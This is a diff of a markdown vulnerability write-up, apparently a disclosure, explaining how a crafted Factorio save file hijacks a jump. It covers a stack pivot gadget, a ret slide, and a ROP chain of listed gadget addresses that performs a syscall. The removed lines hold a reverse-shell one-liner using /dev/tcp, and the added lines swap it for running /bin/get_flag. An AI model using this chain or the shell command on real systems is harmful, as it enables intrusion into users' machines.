@@ -85,14 +85,15 @@ The next thread is a worker thread.
 Immediately we notice multiple interesting things:
 
 1. The thread is attempting to execute a jump
-   ![jump](img/jump.png)
+   ![call](img/call.png)
 2. The jump target is read from the location pointed at by `rbx + 0x40`
 3. `RBX` is pointing into our pattern --> we control the jump target
    ![rbx](img/rbx.png)
-4. `RSP` is also pointing into our pattern --> we control the stack of this thread
-   ![rsp](img/rsp.png)
+4. `RCX` is pointing into our pattern a few bytes after `RBX`
+   ![rcx](img/rcx.png)
 
---> We can use this to build a ROP chain and execute arbitrary code
+--> We can use this to perform a stack pivot (with the gadget `0x2043fa4: mov rsp, rcx; ret;`),
+build a ROP chain and execute arbitrary code.
 
 ### Chain construction:
 
@@ -106,17 +107,32 @@ Essentially, we will reuse a series of existing instructions in the factorio bin
 As we have plenty of space on the chain and don't want to bother ourselves with the libc,
 we will manually execute a syscall.
 
-We only need 4 gadgets:
+We need 5 gadgets for the main chain:
 
-1. `0x4128c8: pop rax; ret;` --> load syscall number into `rax`
-2. `0x4121bf: pop rdi; ret;` --> load first argument into `rdi`
-3. `0x41233d: pop rsi; ret;` --> load second argument into `rsi`
-4. `0x432a96: syscall;` --> execute syscall
-5. `0x1c76e18: mov qword ptr [rax], rsi; ret;` --> modify memory (used to specify target program and arguments)
+1. `0x40e86b: pop rax; ret;` --> load syscall number into `rax`
+2. `0x40e150: pop rdi; ret;` --> load first argument into `rdi`
+3. `0x40e2d4: pop rsi; ret;` --> load second argument into `rsi`
+4. `0x42c4d6: syscall;` --> execute syscall
+5. `0x1c73b08: mov qword ptr [rax], rsi; ret;` --> modify memory (used to specify target program and arguments)
 
-We will execute a simple reverse shell:
+We will execute our target program `get_flag`:
+
 ```bash
-sh -i >& /dev/tcp/127.0.0.1/1337 0>&1
+/bin/get_flag
 ```
+
+In addition to the main chain, we need our stack pivot gadget:
+
+- `0x2043fa4: mov rsp, rcx; ret;`
+
+As the load location of our modified save file is a bit flaky,
+we insert a ret slide which is easier to target than our main chain.
+
+We place the address of the ret slide and the address of the stack pivot gadget
+in the first section of our savefile in an interleaving, repeating pattern.
+The jump will now target the pivot gadget,
+which will point the stack pointer at our ret slide -
+placed in the second section of our save file.
+At the end of the ret slide we place the main chain to execute our target program.
 
 ## Reporting process
